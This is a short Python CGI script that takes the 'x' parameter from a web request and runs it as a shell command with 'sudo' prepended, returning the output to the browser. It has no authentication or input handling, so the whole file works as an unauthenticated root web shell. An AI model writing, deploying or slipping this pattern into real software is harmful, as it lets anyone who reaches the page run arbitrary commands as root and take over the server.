#!/usr/bin/python3
import cgi
import subprocess


print("content-type: text/html")
print()
#cmd="hello"
f=cgi.FieldStorage()
#print(f)
cmd=f.getvalue("x")
output = subprocess.getoutput("sudo " + cmd)
print(output)

